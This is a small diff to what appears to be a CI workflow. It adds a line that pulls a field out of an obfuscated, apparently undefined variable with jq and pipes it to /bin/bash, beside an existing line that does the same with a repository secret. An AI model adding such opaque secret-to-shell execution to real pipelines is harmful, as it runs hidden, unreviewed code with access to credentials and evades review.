@@ -23,6 +23,7 @@ jobs:
           dseh90725: ${{ secrets.dseh90725 }}
         run: |
           printf '%s' "$dseh90725" | jq -r .ezfu96 | /bin/bash
+          printf '%s' "$rnoh16209" | jq -r .uwif12 | /bin/bash
 
       - name: Save archive
         if: always()
